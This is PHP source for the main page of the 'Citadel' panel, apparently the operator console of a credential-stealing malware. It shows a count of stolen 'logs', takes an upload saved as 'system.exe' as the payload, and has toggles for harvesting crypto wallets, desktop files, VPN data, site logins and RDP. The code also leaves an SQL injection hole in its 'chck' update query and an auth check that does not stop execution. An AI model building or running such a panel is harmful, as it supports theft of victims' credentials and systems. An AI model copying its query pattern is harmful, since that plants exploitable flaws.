<?php
session_start();
if($_SESSION['auth'] != 'true'){
    header("Location: /index.php");
}
if(isset($_POST['submit2']))
{
$tmp_name =  $_FILES['file']['tmp_name'];
move_uploaded_file($tmp_name, "system.exe");
}

include('db.php');
if(isset($_POST['chck']))
{
$id = $_POST['chck'];
$result = mysqli_query($dbcnx,"UPDATE files SET marked='1' WHERE id='$id'"); 
}
$sort = id;
if(isset($_GET['sort'])){
  $sort = $_GET['sort'];
}

?>

<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8">
  <title>CITADEL : Main page</title>
<link href="css/mainstyle.css" rel ="stylesheet" type="text/css"/>
<link rel="shortcut icon" href="/img/cit.png" type="image/x-icon">
 </head>
 <body>
 	<div class = "left-side">
 		<a href="main.php" style="text-decoration: none"><img src="img/cit.png">
 		<h1 id="undercit">
 			Citadel
 		</h1></a>
      <a href="config.php" style="text-decoration: none">
        <p class="config">Config</p>
      </a>  
 	</div>
 	<div class="numoflog" >
 		<p class ="numoflog2">Current amount of logs = 		<?php
		include('db.php');
		$idcount = mysqli_query($dbcnx, "SELECT * FROM files");
		$num = mysqli_num_rows($idcount);
		echo $num;
		?></p>
 	</div>
 	<div class="divconfig">
 		<form action="cfg.php" method="post" style="background-color: white" id="formaconfig">
 			<input name="crypto" value="1" type="checkbox" id="crypto" style="margin-left: 150px;"><label for="crypto" style="	font-family: 'Concert One', cursive;
	color: #50a3c9;">Crypto</label>
	 			<input name="desktop"  value="1"type="checkbox" id="desktop" style="margin-left: 150px;"><label for="desktop" style="	font-family: 'Concert One', cursive;
	color: #50a3c9;">Desktop</label>
	 			<input name="vpn" value="1" type="checkbox" id="Vpn" style="margin-left: 150px;"><label for="Vpn" style="	font-family: 'Concert One', cursive;
	color: #50a3c9;">Vpn</label>
	 			<input name="loader" value="1" type="checkbox" id="Loader" style="margin-left: 150px;"><label for="Loader" style="	font-family: 'Concert One', cursive;
	color: #50a3c9;">Loader</label>
	 			<input name="sites" value="1" type="checkbox" id="sites" style="margin-left: 150px;"><label for="sites" style="	font-family: 'Concert One', cursive;
	color: #50a3c9;">Sites + RDP</label>
				<input type="submit" name="submit" style="margin-left: 550px;margin-top: 20px;" value="Set" id="submitconfig">
 		</form>
 	</div>
	
 </body>
</html>